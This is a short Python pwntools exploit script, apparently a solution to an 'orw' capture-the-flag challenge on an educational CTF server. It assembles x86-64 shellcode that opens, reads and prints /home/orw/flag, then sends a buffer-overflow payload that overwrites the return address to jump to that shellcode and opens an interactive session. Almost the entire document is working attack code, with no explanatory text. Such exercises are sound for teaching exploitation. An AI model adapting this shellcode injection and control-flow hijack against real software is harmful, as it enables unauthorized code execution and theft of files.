'/ Open, Read, Write /'
from pwn import *
context(arch = 'amd64', os = 'linux')
# context.log_level = 'debug'
r = remote('edu-ctf.csie.org', 10171)
sc = asm('''
mov rax, 0x67616c662f77
push rax
mov rax, 0x726f2f656d6f682f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall
			/* open("/home/orw/flag", 0, 0) */
mov rdi, rax
mov rsi, 0x6010a0
mov rdx, 0x20
mov rax, 0x0
syscall
			/* read(fd, .bss[0x40], 0x20) */
mov rdi, 0x1
mov rax, 0x1
syscall
			/* write(1, .bss[0x40], 0x20) */
''')
bof = b'A'*0x18 + p64(0x6010a0)
r.sendafter('>', sc)
r.sendlineafter(')', bof)
r.interactive()
